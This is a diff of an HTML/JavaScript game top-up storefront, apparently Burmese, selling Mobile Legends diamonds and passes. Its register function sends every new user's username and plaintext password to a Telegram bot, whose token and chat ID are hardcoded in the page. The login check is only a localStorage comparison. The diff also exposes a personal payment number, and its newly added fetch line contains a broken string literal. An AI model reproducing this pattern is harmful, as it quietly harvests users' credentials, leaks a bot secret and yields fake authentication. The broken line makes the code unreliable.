@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PMK GAME Short MYANMAR</title>
+<title>PMK GAME SHORT MYANMAR</title>
 
 <style>
 :root {
@@ -23,7 +23,7 @@ body {
   overflow-x: hidden;
 }
 
-/* --- Auth (Login/Register) Container --- */
+/* --- Auth Page Style --- */
 #auth-page {
   position: fixed; inset: 0; background: var(--bg);
   display: flex; justify-content: center; align-items: center; z-index: 10000;
@@ -32,17 +32,14 @@ body {
   background: var(--card); padding: 30px 20px; border-radius: 24px;
   width: 85%; max-width: 380px; text-align: center;
   border: 1px solid rgba(0, 242, 254, 0.2);
-  box-shadow: 0 10px 40px rgba(0,0,0,0.6);
 }
-
 .auth-tabs { display: flex; margin-bottom: 20px; background: #0d1117; border-radius: 12px; padding: 5px; }
 .auth-tab { flex: 1; padding: 10px; cursor: pointer; border-radius: 10px; font-weight: bold; color: #8b949e; }
 .auth-tab.active { background: var(--primary); color: #000; }
-
 .auth-form { display: none; }
 .auth-form.active { display: block; }
 
-/* --- Main Page UI --- */
+/* --- Main Page Style --- */
 #main-page { display: none; }
 header {
   background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
@@ -51,7 +48,7 @@ header {
 }
 
 .tabs { display: flex; justify-content: center; gap: 10px; padding: 15px; }
-.tab-btn { flex: 1; padding: 12px; background: var(--item); border: 1px solid #30363d; color: #8b949e; border-radius: 12px; font-weight: bold; cursor: pointer; }
+.tab-btn { flex: 1; padding: 12px; background: var(--item); border: 1px solid #30363d; color: #8b949e; border-radius: 12px; font-weight: bold; cursor: pointer; text-align: center;}
 .tab-btn.active { background: linear-gradient(45deg, var(--secondary), var(--primary)); color: #000; }
 
 section { padding: 15px; max-width: 600px; margin: auto; }
@@ -59,22 +56,25 @@ section { padding: 15px; max-width: 600px; margin: auto; }
 .server-content.active { display: block; }
 
 .card { background: var(--card); border-radius: 20px; padding: 15px; margin-bottom: 20px; border: 1px solid #30363d; }
-h2 { color: var(--primary); margin-top: 0; font-size: 1rem; border-left: 4px solid var(--primary); padding-left: 10px; }
+h2 { color: var(--primary); margin-top: 0; font-size: 1rem; border-left: 4px solid var(--primary); padding-left: 10px; margin-bottom: 15px; }
 
 .diamond-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-.diamond-item { background: var(--item); border-radius: 12px; padding: 15px 5px; text-align: center; font-size: 11px; cursor: pointer; }
-.price { margin-top: 5px; font-weight: bold; color: var(--primary); }
+.diamond-item { 
+  background: var(--item); border-radius: 12px; padding: 15px 5px; 
+  text-align: center; font-size: 11px; cursor: pointer; border: 1px solid transparent; transition: 0.2s;
+}
+.diamond-item:hover { border-color: var(--primary); }
+.price { margin-top: 5px; font-weight: bold; color: var(--primary); font-size: 10px; }
 
 input, select { width: 100%; padding: 14px; margin-top: 12px; border-radius: 12px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
 
 .btn { margin-top: 20px; padding: 15px; background: linear-gradient(45deg, var(--secondary), var(--primary)); color: #000; text-align: center; border-radius: 12px; font-weight: bold; cursor: pointer; }
-.btn-logout { background: transparent; border: 1px solid #ff6b6b; color: #ff6b6b; margin-top: 30px; }
 
 .popup { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.9); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(8px); }
 .popup-box { background: #1c2128; width: 90%; max-width: 400px; border-radius: 24px; padding: 25px; border: 1px solid var(--primary); }
 #preview { width: 100px; border-radius: 8px; margin-top: 10px; display: none; border: 1px solid var(--primary); }
 
-.history-item { background: var(--card); padding: 12px; border-radius: 12px; margin-top: 10px; border-left: 4px solid var(--primary); font-size: 12px; }
+.history-item { background: var(--card); padding: 12px; border-radius: 12px; margin-top: 10px; border-left: 4px solid var(--primary); font-size: 11px; }
 </style>
 </head>
 
@@ -82,7 +82,7 @@ input, select { width: 100%; padding: 14px; margin-top: 12px; border-radius: 12p
 
 <div id="auth-page">
   <div class="auth-container">
-    <h1 style="color: var(--primary); margin-bottom: 20px;">PMK GAME SHOP</h1>
+    <h1 style="color: var(--primary); margin-bottom: 20px; font-size: 22px;">PMK GAME SHOP</h1>
     
     <div class="auth-tabs">
       <div id="tab-login" class="auth-tab active" onclick="toggleAuth('login')">အကောင့်ဝင်ရန်</div>
@@ -90,43 +90,63 @@ input, select { width: 100%; padding: 14px; margin-top: 12px; border-radius: 12p
     </div>
 
     <div id="login-form" class="auth-form active">
-      <input type="text" id="l-user" placeholder="အမည် (Username)">
-      <input type="password" id="l-pass" placeholder="စကားဝှက် (Password)">
+      <input type="text" id="l-user" placeholder="Username">
+      <input type="password" id="l-pass" placeholder="Password">
       <div class="btn" onclick="login()">ဝင်မည်</div>
     </div>
 
     <div id="register-form" class="auth-form">
-      <input type="text" id="r-user" placeholder="အမည်သစ် (New Username)">
-      <input type="password" id="r-pass" placeholder="စကားဝှက်အသစ် (New Password)">
-      <div class="btn" onclick="register()">အကောင့်ဖွင့်မည်</div>
+      <input type="text" id="r-user" placeholder="New Username">
+      <input type="password" id="r-pass" placeholder="New Password">
+      <div class="btn" onclick="register()">အကောင့်သစ်ဖွင့်မည်</div>
     </div>
   </div>
 </div>
 
 <div id="main-page">
-  <header>🎮 PMK GAME SHOP 💎</header>
+  <header>🎮 PMK GAME SHORT MYANMAR 💎</header>
   
   <div class="tabs">
     <div class="tab-btn active" onclick="switchTab('normal', this)">Direct Server</div>
-    <div class="tab-btn" onclick="switchTab('malaysia', this)">Malaysia Server</div>
+    <div class="tab-btn" onclick="switchTab('malaysia', this)">Malaysia 🇲🇾</div>
   </div>
 
   <section>
     <div id="normal" class="server-content active">
       <div class="card">
-        <h2>🎟 Monthly / Weekly Pass</h2>
+        <h2>🎟 Special Passes</h2>
         <div class="diamond-grid">
-          <div class="diamond-item" onclick="openOrder('Weekly Pass - 6000 Ks')">💎 Weekly<div class="price">6000 Ks</div></div>
-          <div class="diamond-item" onclick="openOrder('Value Pack - 1500 Ks')">💎 Value Pack<div class="price">1500 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('Weekly Diamond Pass', '6,500 Ks')">💎 Weekly<div class="price">6,500 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('Weekly (2X)', '13,000 Ks')">💎 Weekly x2<div class="price">13,000 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('Twilight Pass', '32,000 Ks')">🌙 Twilight<div class="price">32,000 Ks</div></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>💎 Mobile Legends Diamonds</h2>
+        <div class="diamond-grid">
+          <div class="diamond-item" onclick="openOrder('86 Diamonds', '5,500 Ks')">💎 86<div class="price">5,500 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('172 Diamonds', '10,800 Ks')">💎 172<div class="price">10,800 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('257 Diamonds', '15,800 Ks')">💎 257<div class="price">15,800 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('344 Diamonds', '21,500 Ks')">💎 344<div class="price">21,500 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('429 Diamonds', '26,500 Ks')">💎 429<div class="price">26,500 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('514 Diamonds', '31,500 Ks')">💎 514<div class="price">31,500 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('706 Diamonds', '43,000 Ks')">💎 706<div class="price">43,000 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('1050 Diamonds', '64,000 Ks')">💎 1050<div class="price">64,000 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('2195 Diamonds', '128,000 Ks')">💎 2195<div class="price">128,000 Ks</div></div>
         </div>
       </div>
     </div>
 
     <div id="malaysia" class="server-content">
       <div class="card">
-        <h2>🇲🇾 Malaysia Server</h2>
+        <h2>🇲🇾 Malaysia Server MLBB</h2>
         <div class="diamond-grid">
-          <div class="diamond-item" onclick="openOrder('Weekly (MY) - 9000 Ks')">🎟 Weekly<div class="price">9000 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('Weekly Pass (MY)', '9,500 Ks')">🎟 Weekly<div class="price">9,500 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('74 Dia (MY)', '5,500 Ks')">💎 74<div class="price">5,500 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('221 Dia (MY)', '15,500 Ks')">💎 221<div class="price">15,500 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('442 Dia (MY)', '29,500 Ks')">💎 442<div class="price">29,500 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('884 Dia (MY)', '58,000 Ks')">💎 884<div class="price">58,000 Ks</div></div>
         </div>
       </div>
     </div>
@@ -134,13 +154,15 @@ input, select { width: 100%; padding: 14px; margin-top: 12px; border-radius: 12p
     <h2 style="text-align:center; border:none; margin-top:30px;">📜 ဝယ်ယူမှုမှတ်တမ်း</h2>
     <div id="history-list"></div>
     
-    <div class="btn btn-logout" onclick="logout()">Logout (အကောင့်ထွက်ရန်)</div>
+    <div style="text-align:center; margin: 30px 0; color:#ff6b6b; cursor:pointer;" onclick="location.reload()">Logout</div>
   </section>
 </div>
 
 <div class="popup" id="popup">
   <div class="popup-box">
-    <h2 id="orderTitle" style="border:none; text-align:center;"></h2>
+    <h2 id="orderTitle" style="border:none; text-align:center; font-size: 16px;"></h2>
+    <p id="orderPrice" style="text-align:center; color: var(--primary); font-weight:bold;"></p>
+    
     <input type="number" id="game_id" placeholder="Game ID">
     <input type="number" id="server_id" placeholder="Server ID">
     <select id="payment_method">
@@ -148,10 +170,15 @@ input, select { width: 100%; padding: 14px; margin-top: 12px; border-radius: 12p
       <option>KBZ Pay</option>
       <option>Wave Pay</option>
     </select>
+    
+    <div style="font-size:11px; padding:10px; border:1px dashed var(--primary); margin-top:10px; border-radius:10px;">
+        Kpay/Wave: 09789457150 (Nyein Ei Phyo)
+    </div>
+
     <input type="file" id="receipt" accept="image/*">
     <center><img id="preview"></center>
     <div class="btn" id="confirm-btn" onclick="submitOrder()">📩 Confirm Order</div>
-    <div style="text-align:center; margin-top:10px; color:#ff6b6b; cursor:pointer;" onclick="closeOrder()">ပိတ်မည်</div>
+    <div style="text-align:center; margin-top:15px; color:#ff6b6b; cursor:pointer;" onclick="closeOrder()">မဝယ်တော့ပါ</div>
   </div>
 </div>
 
@@ -159,11 +186,10 @@ input, select { width: 100%; padding: 14px; margin-top: 12px; border-radius: 12p
 const BOT_TOKEN = "8540139841:AAHk85ZhZybd1Wh_YAWqeCk6OpTCjqNojr8";
 const CHAT_ID = "8582088849";
 
-// --- Auth System (Login/Register) ---
+// --- Login/Register Logic ---
 function toggleAuth(type) {
   document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
   document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
-  
   if(type === 'login') {
     document.getElementById('tab-login').classList.add('active');
     document.getElementById('login-form').classList.add('active');
@@ -176,39 +202,28 @@ function toggleAuth(type) {
 function register() {
   const u = document.getElementById('r-user').value.trim();
   const p = document.getElementById('r-pass').value.trim();
-  if(!u || !p) return alert("အချက်အလက်ပြည့်စုံစွာဖြည့်ပါ။");
-
-  localStorage.setItem('pmk_user', u);
-  localStorage.setItem('pmk_pass', p);
-
-  // Telegram ကို ပို့မည်
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🆕 Register အသစ်\n👤 အမည်: "+u+"\n🔑 စကားဝှက်: "+p)}`);
-  
-  alert("အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်။ Login ဝင်နိုင်ပါပြီ။");
+  if(!u || !p) return alert("ဖြည့်စွက်ပေးပါ");
+  localStorage.setItem('pmk_u', u);
+  localStorage.setItem('pmk_p', p);
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(SHRegister\nUser: "+u+"\nPass: "+p)}`);
+  alert("အကောင့်ဖွင့်ပြီးပါပြီ။ Login ပြန်ဝင်ပါ။");
   toggleAuth('login');
 }
 
 function login() {
   const u = document.getElementById('l-user').value.trim();
   const p = document.getElementById('l-pass').value.trim();
-  const savedU = localStorage.getItem('pmk_user');
-  const savedP = localStorage.getItem('pmk_pass');
-
-  if(u === savedU && p === savedP && u !== null) {
+  if(u === localStorage.getItem('pmk_u') && p === localStorage.getItem('pmk_p') && u !== null) {
     document.getElementById('auth-page').style.display = 'none';
     document.getElementById('main-page').style.display = 'block';
     loadHistory();
   } else {
-    alert("အမည် သို့မဟုတ် စကားဝှက် မှားယွင်းနေပါသည်။ (အကောင့်မရှိသေးပါက Register အရင်လုပ်ပါ)");
+    alert("အမည် သို့မဟုတ် စကားဝှက် မှားယွင်းနေပါသည်။");
   }
 }
 
-function logout() {
-  location.reload();
-}
-
-// --- Shop System ---
-let currentItem = "";
+// --- Shop Logic ---
+let selectedItem = "";
 function switchTab(id, el) {
   document.querySelectorAll('.server-content').forEach(s => s.classList.remove('active'));
   document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -216,9 +231,10 @@ function switchTab(id, el) {
   el.classList.add('active');
 }
 
-function openOrder(item) {
-  currentItem = item;
+function openOrder(item, price) {
+  selectedItem = item;
   document.getElementById('orderTitle').innerText = item;
+  document.getElementById('orderPrice').innerText = price;
   document.getElementById('popup').style.display = 'flex';
 }
 
@@ -239,24 +255,24 @@ async function submitOrder() {
 
   if(!gid || !sid || !pay || !img) return alert("အချက်အလက်ပြည့်စုံစွာဖြည့်ပါ။");
 
-  btn.innerText = "ခဏစောင့်ပါ...";
+  btn.innerText = "Processing...";
   btn.style.pointerEvents = "none";
 
   const formData = new FormData();
   formData.append("chat_id", CHAT_ID);
-  const caption = `🎯 Order အသစ်\n👤 ဝယ်သူ: ${localStorage.getItem('pmk_user')}\n💎 ပစ္စည်း: ${currentItem}\n🎮 ID: ${gid}(${sid})\n💳 Pay: ${pay}`;
+  const caption = `🚀 ORDER NEW\n━━━━━━━━━━━━━━\n👤 User: ${localStorage.getItem('pmk_u')}\n💎 Item: ${selectedItem}\n🎮 ID: ${gid}(${sid})\n💳 Pay: ${pay}`;
   formData.append("caption", caption);
   formData.append("photo", img);
 
   try {
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
     if(res.ok) {
-      saveHistory(currentItem, gid, sid);
-      alert("ဝယ်ယူမှု အောင်မြင်ပါသည်။");
+      saveHistory(selectedItem, gid, sid);
+      alert("Order တင်ခြင်း အောင်မြင်ပါသည်။");
       closeOrder();
     }
-  } catch (e) { alert("Error ဖြစ်သွားပါသည်။"); }
-  finally { btn.innerText = "Confirm Order"; btn.style.pointerEvents = "auto"; }
+  } catch (e) { alert("Error!"); }
+  finally { btn.innerText = "📩 Confirm Order"; btn.style.pointerEvents = "auto"; }
 }
 
 function saveHistory(item, gid, sid) {
@@ -270,7 +286,7 @@ function loadHistory() {
   const box = document.getElementById('history-list');
   let h = JSON.parse(localStorage.getItem('pmk_history')) || [];
   if(h.length === 0) return box.innerHTML = "<p style='text-align:center; font-size:12px;'>မှတ်တမ်းမရှိသေးပါ။</p>";
-  box.innerHTML = h.reverse().slice(0, 5).map(i => `<div class="history-item"><b>${i.item}</b><br>ID: ${i.gid}(${i.sid})<br><small>${i.time}</small></div>`).join('');
+  box.innerHTML = h.reverse().slice(0, 5).map(i => `<div class="history-item"><b>${i.item}</b> - ID: ${i.gid}(${i.sid})<br><small>${i.time}</small></div>`).join('');
 }
 </script>
 
